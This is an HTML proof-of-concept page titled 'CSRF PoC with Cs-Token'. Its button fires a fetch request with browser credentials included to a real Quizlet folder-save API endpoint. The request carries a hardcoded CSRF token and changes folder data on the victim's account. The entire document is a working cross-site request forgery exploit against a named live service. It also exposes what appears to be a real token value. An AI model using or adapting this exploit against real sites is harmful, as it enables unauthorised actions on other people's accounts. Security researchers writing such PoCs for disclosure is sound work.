<!DOCTYPE html>
<html>
  <body>
    <h3>CSRF PoC with Cs-Token</h3>
    <button onclick="send()">Click to send CSRF</button>

    <script>
      function send() {
        fetch("https://quizlet.com/webapi/3.2/folders/save?_method=PUT", {
          method: "POST",
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
            "Cs-Token": "777KPGM3bmXwpW9PChQGyk"
          },
          body: JSON.stringify({
            data: [
              {
                name: "api2",
                description: ""
              }
            ]
          })
        }).then(res => {
          console.log("Response status:", res.status);
          return res.text();
        }).then(text => {
          console.log("Response body:", text);
        });
      }
    </script>
  </body>
</html>
